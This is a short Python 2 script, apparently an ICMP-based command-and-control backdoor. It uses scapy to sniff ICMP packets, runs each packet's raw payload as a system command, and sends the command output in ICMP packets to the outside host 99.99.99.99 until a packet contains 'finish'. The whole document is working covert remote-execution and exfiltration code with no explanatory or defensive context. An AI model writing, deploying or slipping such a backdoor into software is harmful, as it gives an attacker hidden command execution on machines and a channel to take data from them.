import time
from scapy.all import *
while 1:
	p=sniff(count=1,filter="icmp")
	s=str(p[0])
	if "finish" in s:
		print "Exiting C&C ..."
		time.sleep(1)
		break
	else :
		res=p[0][Raw]
		c=subprocess.Popen(str(res),stdout=subprocess.PIPE)
		s=c.communicate()
		time.sleep(1)
		send(IP(src="127.0.0.1",dst="99.99.99.99")/ICMP()/str(s))

